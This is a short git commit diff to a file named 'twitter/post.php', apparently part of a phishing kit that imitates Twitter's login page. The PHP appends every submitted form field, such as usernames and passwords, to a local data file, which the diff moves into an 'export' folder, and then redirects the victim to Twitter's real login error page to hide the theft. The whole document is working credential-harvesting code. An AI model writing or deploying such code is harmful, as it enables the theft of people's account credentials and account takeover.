5828c8604acb3c47a59a95b6888584edba5e1f9e
mak <makindosx@gmail.com>
2017-11-29 19:53:14 +0200

    Add files via upload

--- twitter/post.php
+++ twitter/post.php
@@ -1,4 +1,4 @@
-<?php $file = "data.txt";
+<?php $file = "export/data.txt";
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 ?>
 <meta http-equiv="refresh" content="0; url=https://twitter.com/login/error?username_or_email=&redirect_after_login=%2F%3Flang%3Del" />
